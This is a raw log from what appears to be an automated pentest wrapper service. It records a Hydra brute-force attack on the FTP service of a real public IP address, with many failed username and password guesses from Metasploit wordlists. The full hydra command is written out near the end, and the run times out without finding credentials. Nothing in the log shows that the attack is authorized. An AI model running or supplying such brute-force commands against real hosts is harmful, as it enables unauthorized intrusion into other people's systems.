2025-10-24 01:38:31,393 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m92.7%[0m ETA: 21.9s Speed: 2 B/s | 278.1s | PID: 44124
2025-10-24 01:38:31,577 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :someday (Incorrect: )
2025-10-24 01:38:31,752 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m47.8%[0m ETA: 156.6s Speed: 164 B/s | 143.4s | PID: 44299
2025-10-24 01:38:32,122 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sql2010 (Incorrect: )
2025-10-24 01:38:32,196 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m93.0%[0m ETA: 21.1s Speed: 2 B/s | 278.9s | PID: 44124
2025-10-24 01:38:32,554 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m48.1%[0m ETA: 155.8s Speed: 163 B/s | 144.2s | PID: 44299
2025-10-24 01:38:32,706 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sql2011 (Incorrect: )
2025-10-24 01:38:32,996 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████████████████[38;5;240m░░░[0m] [38;5;160m93.2%[0m ETA: 20.3s Speed: 2 B/s | 279.7s | PID: 44124
2025-10-24 01:38:33,261 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :sql2009 (Incorrect: )
2025-10-24 01:38:33,356 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m48.3%[0m ETA: 155.0s Speed: 164 B/s | 145.0s | PID: 44299
2025-10-24 01:38:33,798 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m93.5%[0m ETA: 19.5s Speed: 2 B/s | 280.5s | PID: 44124
2025-10-24 01:38:33,808 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :complex (Incorrect: )
2025-10-24 01:38:34,158 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m48.6%[0m ETA: 154.2s Speed: 164 B/s | 145.8s | PID: 44299
2025-10-24 01:38:34,331 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :goat (Incorrect: )
2025-10-24 01:38:34,601 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m93.8%[0m ETA: 18.7s Speed: 2 B/s | 281.3s | PID: 44124
2025-10-24 01:38:34,871 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :changelater (Incorrect: )
2025-10-24 01:38:34,959 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m48.9%[0m ETA: 153.4s Speed: 164 B/s | 146.6s | PID: 44299
2025-10-24 01:38:35,402 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m94.0%[0m ETA: 17.9s Speed: 2 B/s | 282.1s | PID: 44124
2025-10-24 01:38:35,402 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :rain (Incorrect: )
2025-10-24 01:38:35,760 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m49.1%[0m ETA: 152.6s Speed: 164 B/s | 147.4s | PID: 44299
2025-10-24 01:38:35,962 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :fire (Incorrect: )
2025-10-24 01:38:36,203 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m94.3%[0m ETA: 17.1s Speed: 2 B/s | 282.9s | PID: 44124
2025-10-24 01:38:36,485 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :snow (Incorrect: )
2025-10-24 01:38:36,562 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m49.4%[0m ETA: 151.8s Speed: 164 B/s | 148.2s | PID: 44299
2025-10-24 01:38:37,005 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m94.6%[0m ETA: 16.3s Speed: 2 B/s | 283.7s | PID: 44124
2025-10-24 01:38:37,006 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :unchanged (Incorrect: )
2025-10-24 01:38:37,363 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m49.7%[0m ETA: 151.0s Speed: 164 B/s | 149.0s | PID: 44299
2025-10-24 01:38:37,564 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :qwerty (Incorrect: )
2025-10-24 01:38:37,806 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m94.8%[0m ETA: 15.5s Speed: 2 B/s | 284.5s | PID: 44124
2025-10-24 01:38:38,095 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :12345678 (Incorrect: )
2025-10-24 01:38:38,165 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████[38;5;240m░░░░░░░░░░░░░░░░[0m] [38;5;160m49.9%[0m ETA: 150.2s Speed: 164 B/s | 149.8s | PID: 44299
2025-10-24 01:38:38,609 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m95.1%[0m ETA: 14.7s Speed: 2 B/s | 285.3s | PID: 44124
2025-10-24 01:38:38,649 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :football (Incorrect: )
2025-10-24 01:38:38,966 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m50.2%[0m ETA: 149.4s Speed: 164 B/s | 150.6s | PID: 44299
2025-10-24 01:38:39,173 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :baseball (Incorrect: )
2025-10-24 01:38:39,410 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m95.4%[0m ETA: 13.9s Speed: 2 B/s | 286.1s | PID: 44124
2025-10-24 01:38:39,696 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :basketball (Incorrect: )
2025-10-24 01:38:39,768 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m50.5%[0m ETA: 148.6s Speed: 165 B/s | 151.4s | PID: 44299
2025-10-24 01:38:40,212 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m95.6%[0m ETA: 13.1s Speed: 2 B/s | 286.9s | PID: 44124
2025-10-24 01:38:40,238 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :abc123 (Incorrect: )
2025-10-24 01:38:40,569 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m50.7%[0m ETA: 147.8s Speed: 164 B/s | 152.2s | PID: 44299
2025-10-24 01:38:40,782 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :111111 (Incorrect: )
2025-10-24 01:38:41,013 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m95.9%[0m ETA: 12.3s Speed: 2 B/s | 287.7s | PID: 44124
2025-10-24 01:38:41,305 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :1qaz2wsx (Incorrect: )
2025-10-24 01:38:41,373 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m51.0%[0m ETA: 147.0s Speed: 165 B/s | 153.0s | PID: 44299
2025-10-24 01:38:41,814 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m96.2%[0m ETA: 11.5s Speed: 2 B/s | 288.5s | PID: 44124
2025-10-24 01:38:41,824 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :dragon (Incorrect: )
2025-10-24 01:38:42,174 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m51.3%[0m ETA: 146.2s Speed: 165 B/s | 153.8s | PID: 44299
2025-10-24 01:38:42,347 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :master (Incorrect: )
2025-10-24 01:38:42,616 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████████████████[38;5;240m░░[0m] [38;5;160m96.4%[0m ETA: 10.7s Speed: 2 B/s | 289.3s | PID: 44124
2025-10-24 01:38:42,881 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :monkey (Incorrect: )
2025-10-24 01:38:42,974 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m51.5%[0m ETA: 145.4s Speed: 165 B/s | 154.6s | PID: 44299
2025-10-24 01:38:43,402 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :letmein (Incorrect: )
2025-10-24 01:38:43,419 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m96.7%[0m ETA: 9.9s Speed: 2 B/s | 290.1s | PID: 44124
2025-10-24 01:38:43,776 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m51.8%[0m ETA: 144.6s Speed: 165 B/s | 155.4s | PID: 44299
2025-10-24 01:38:43,940 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :login (Incorrect: )
2025-10-24 01:38:44,220 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m97.0%[0m ETA: 9.1s Speed: 2 B/s | 290.9s | PID: 44124
2025-10-24 01:38:44,514 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :princess (Incorrect: )
2025-10-24 01:38:44,579 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m52.1%[0m ETA: 143.7s Speed: 165 B/s | 156.3s | PID: 44299
2025-10-24 01:38:45,023 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m97.2%[0m ETA: 8.3s Speed: 2 B/s | 291.7s | PID: 44124
2025-10-24 01:38:45,111 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :solo (Incorrect: )
2025-10-24 01:38:45,380 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m52.4%[0m ETA: 142.9s Speed: 165 B/s | 157.1s | PID: 44299
2025-10-24 01:38:45,631 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :qwertyuiop (Incorrect: )
2025-10-24 01:38:45,825 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m97.5%[0m ETA: 7.5s Speed: 2 B/s | 292.5s | PID: 44124
2025-10-24 01:38:46,163 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: :starwars (Incorrect: )
2025-10-24 01:38:46,182 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m52.6%[0m ETA: 142.1s Speed: 165 B/s | 157.9s | PID: 44299
2025-10-24 01:38:46,627 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m97.8%[0m ETA: 6.7s Speed: 2 B/s | 293.3s | PID: 44124
2025-10-24 01:38:46,985 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m52.9%[0m ETA: 141.3s Speed: 164 B/s | 158.7s | PID: 44299
2025-10-24 01:38:47,428 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m98.0%[0m ETA: 5.9s Speed: 2 B/s | 294.1s | PID: 44124
2025-10-24 01:38:47,791 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m███████████████[38;5;240m░░░░░░░░░░░░░░░[0m] [38;5;160m53.2%[0m ETA: 140.5s Speed: 164 B/s | 159.5s | PID: 44299
2025-10-24 01:38:48,231 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m98.3%[0m ETA: 5.1s Speed: 2 B/s | 294.9s | PID: 44124
2025-10-24 01:38:48,592 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m53.4%[0m ETA: 139.7s Speed: 163 B/s | 160.3s | PID: 44299
2025-10-24 01:38:49,007 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Spring2017 (Incorrect: )
2025-10-24 01:38:49,033 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m98.6%[0m ETA: 4.3s Speed: 2 B/s | 295.7s | PID: 44124
2025-10-24 01:38:49,393 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m53.7%[0m ETA: 138.9s Speed: 163 B/s | 161.1s | PID: 44299
2025-10-24 01:38:49,833 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m98.8%[0m ETA: 3.5s Speed: 2 B/s | 296.5s | PID: 44124
2025-10-24 01:38:50,196 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m54.0%[0m ETA: 138.1s Speed: 162 B/s | 161.9s | PID: 44299
2025-10-24 01:38:50,634 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m99.1%[0m ETA: 2.7s Speed: 2 B/s | 297.3s | PID: 44124
2025-10-24 01:38:51,000 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m54.2%[0m ETA: 137.3s Speed: 161 B/s | 162.7s | PID: 44299
2025-10-24 01:38:51,435 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m99.4%[0m ETA: 1.9s Speed: 2 B/s | 298.1s | PID: 44124
2025-10-24 01:38:51,801 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m54.5%[0m ETA: 136.5s Speed: 160 B/s | 163.5s | PID: 44299
2025-10-24 01:38:52,236 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m99.6%[0m ETA: 1.1s Speed: 2 B/s | 298.9s | PID: 44124
2025-10-24 01:38:52,600 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Spring2021 (Incorrect: )
2025-10-24 01:38:52,601 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m54.8%[0m ETA: 135.7s Speed: 160 B/s | 164.3s | PID: 44299
2025-10-24 01:38:53,036 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████████████████[38;5;240m░[0m] [38;5;160m99.9%[0m ETA: 0.3s Speed: 2 B/s | 299.7s | PID: 44124
2025-10-24 01:38:53,310 - __main__ - WARNING - ⏰ TIMEOUT: Command timed out after 300s | Terminating PID 44124
2025-10-24 01:38:53,311 - __main__ - INFO - [38;5;46m[1m╭─────────────────────────────────────────────────────────────────────────────╮[0m
2025-10-24 01:38:53,311 - __main__ - INFO - [1m│[0m [38;5;46m📊 FINAL RESULTS ✅[0m
2025-10-24 01:38:53,311 - __main__ - INFO - [1m├─────────────────────────────────────────────────────────────────────────────┤[0m
2025-10-24 01:38:53,311 - __main__ - INFO - [1m│[0m [38;5;51m🚀 Command:[0m hydra -L /usr/share/wordlists/metasploit/unix_users.txt...
2025-10-24 01:38:53,311 - __main__ - INFO - [1m│[0m [38;5;208m⏱️  Duration:[0m 300.01s [38;5;208m[TIMEOUT][0m
2025-10-24 01:38:53,311 - __main__ - INFO - [1m│[0m [38;5;208m📊 Output Size:[0m 602 bytes
2025-10-24 01:38:53,311 - __main__ - INFO - [1m│[0m [38;5;129m🔢 Exit Code:[0m -1
2025-10-24 01:38:53,311 - __main__ - INFO - [1m│[0m [38;5;46m📈 Status:[0m SUCCESS | Cached: Yes
2025-10-24 01:38:53,311 - __main__ - INFO - [38;5;46m[1m╰─────────────────────────────────────────────────────────────────────────────╯[0m
2025-10-24 01:38:53,311 - __main__ - INFO - 💾 Cached result for command: hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt ftp://138.197.27.76:21 -t 4 -f
2025-10-24 01:38:53,312 - werkzeug - INFO - 127.0.0.1 - - [24/Oct/2025 01:38:53] "POST /api/command HTTP/1.1" 200 -
2025-10-24 01:38:53,401 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m55.0%[0m ETA: 134.9s Speed: 159 B/s | 165.1s | PID: 44299
2025-10-24 01:38:54,203 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m55.3%[0m ETA: 134.1s Speed: 159 B/s | 165.9s | PID: 44299
2025-10-24 01:38:55,004 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m55.6%[0m ETA: 133.3s Speed: 158 B/s | 166.7s | PID: 44299
2025-10-24 01:38:55,805 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m55.8%[0m ETA: 132.5s Speed: 157 B/s | 167.5s | PID: 44299
2025-10-24 01:38:55,947 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:spring2021 (Incorrect: )
2025-10-24 01:38:56,606 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m56.1%[0m ETA: 131.7s Speed: 157 B/s | 168.3s | PID: 44299
2025-10-24 01:38:57,407 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m56.4%[0m ETA: 130.9s Speed: 156 B/s | 169.1s | PID: 44299
2025-10-24 01:38:58,208 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m████████████████[38;5;240m░░░░░░░░░░░░░░[0m] [38;5;160m56.6%[0m ETA: 130.1s Speed: 155 B/s | 169.9s | PID: 44299
2025-10-24 01:38:58,865 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Summer2021 (Incorrect: )
2025-10-24 01:38:59,009 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m56.9%[0m ETA: 129.3s Speed: 155 B/s | 170.7s | PID: 44299
2025-10-24 01:38:59,809 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m57.2%[0m ETA: 128.5s Speed: 155 B/s | 171.5s | PID: 44299
2025-10-24 01:39:00,611 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m57.4%[0m ETA: 127.7s Speed: 154 B/s | 172.3s | PID: 44299
2025-10-24 01:39:01,412 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m57.7%[0m ETA: 126.9s Speed: 153 B/s | 173.1s | PID: 44299
2025-10-24 01:39:02,031 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:summer2021 (Incorrect: )
2025-10-24 01:39:02,213 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m58.0%[0m ETA: 126.1s Speed: 153 B/s | 173.9s | PID: 44299
2025-10-24 01:39:03,014 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m58.2%[0m ETA: 125.3s Speed: 152 B/s | 174.7s | PID: 44299
2025-10-24 01:39:03,815 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m58.5%[0m ETA: 124.5s Speed: 152 B/s | 175.5s | PID: 44299
2025-10-24 01:39:04,617 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m58.8%[0m ETA: 123.7s Speed: 151 B/s | 176.3s | PID: 44299
2025-10-24 01:39:05,416 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Autumn2021 (Incorrect: )
2025-10-24 01:39:05,418 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m59.0%[0m ETA: 122.9s Speed: 151 B/s | 177.1s | PID: 44299
2025-10-24 01:39:06,218 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m59.3%[0m ETA: 122.1s Speed: 150 B/s | 177.9s | PID: 44299
2025-10-24 01:39:07,020 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m59.6%[0m ETA: 121.3s Speed: 150 B/s | 178.7s | PID: 44299
2025-10-24 01:39:07,821 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m█████████████████[38;5;240m░░░░░░░░░░░░░[0m] [38;5;160m59.8%[0m ETA: 120.5s Speed: 149 B/s | 179.5s | PID: 44299
2025-10-24 01:39:08,556 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:autumn2021 (Incorrect: )
2025-10-24 01:39:08,622 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m60.1%[0m ETA: 119.7s Speed: 149 B/s | 180.3s | PID: 44299
2025-10-24 01:39:09,422 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m60.4%[0m ETA: 118.9s Speed: 148 B/s | 181.1s | PID: 44299
2025-10-24 01:39:10,224 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m60.6%[0m ETA: 118.1s Speed: 148 B/s | 181.9s | PID: 44299
2025-10-24 01:39:11,025 - __main__ - INFO - ⚡ PROGRESS ⠇: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m60.9%[0m ETA: 117.3s Speed: 147 B/s | 182.7s | PID: 44299
2025-10-24 01:39:11,428 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:Fall2021 (Incorrect: )
2025-10-24 01:39:11,826 - __main__ - INFO - ⚡ PROGRESS ⠏: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m61.2%[0m ETA: 116.5s Speed: 147 B/s | 183.5s | PID: 44299
2025-10-24 01:39:12,627 - __main__ - INFO - ⚡ PROGRESS ⠋: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m61.4%[0m ETA: 115.7s Speed: 146 B/s | 184.3s | PID: 44299
2025-10-24 01:39:13,427 - __main__ - INFO - ⚡ PROGRESS ⠙: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m61.7%[0m ETA: 114.9s Speed: 146 B/s | 185.1s | PID: 44299
2025-10-24 01:39:14,228 - __main__ - INFO - ⚡ PROGRESS ⠹: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m62.0%[0m ETA: 114.1s Speed: 145 B/s | 185.9s | PID: 44299
2025-10-24 01:39:15,028 - __main__ - INFO - ⚡ PROGRESS ⠸: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m62.2%[0m ETA: 113.3s Speed: 144 B/s | 186.7s | PID: 44299
2025-10-24 01:39:15,053 - __main__ - INFO - 📤 STDOUT: [1m[31m[-][0m 138.197.27.76:21      - 138.197.27.76:21 - LOGIN FAILED: 4Dgifts:fall2021 (Incorrect: )
2025-10-24 01:39:15,829 - __main__ - INFO - ⚡ PROGRESS ⠼: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m62.5%[0m ETA: 112.5s Speed: 144 B/s | 187.5s | PID: 44299
2025-10-24 01:39:16,630 - __main__ - INFO - ⚡ PROGRESS ⠴: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m62.8%[0m ETA: 111.7s Speed: 144 B/s | 188.3s | PID: 44299
2025-10-24 01:39:17,432 - __main__ - INFO - ⚡ PROGRESS ⠦: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m63.0%[0m ETA: 110.9s Speed: 143 B/s | 189.1s | PID: 44299
2025-10-24 01:39:18,233 - __main__ - INFO - ⚡ PROGRESS ⠧: [[38;5;196m██████████████████[38;5;240m░░░░░░░░░░░░[0m] [38;5;160m63.3%[0m ETA: 110.1s Speed: 142 B/s | 189.9s | PID: 44299
